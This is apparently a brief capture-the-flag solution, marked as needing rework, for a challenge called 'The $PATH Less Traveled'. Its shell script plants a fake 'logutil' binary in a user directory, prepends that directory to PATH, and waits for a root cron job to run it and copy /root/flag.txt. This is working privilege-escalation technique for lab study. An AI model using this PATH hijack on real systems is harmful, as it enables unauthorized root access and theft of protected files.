# The $PATH Less Traveled

## Solution:

TOdO rework this
```sh
# Create fake logutil in user-owned directory
mkdir -p ~/bin
echo -e '#!/bin/bash\ncat /root/flag.txt > /home/ctf/flag_copy.txt' > ~/bin/logutil
chmod +x ~/bin/logutil

echo 'export PATH=/home/ctf/bin:$PATH' >> ~/.bashrc
source ~/.bashrc
# Wait ~1 minute for cron to run, then watch output or redirect somewhere
```

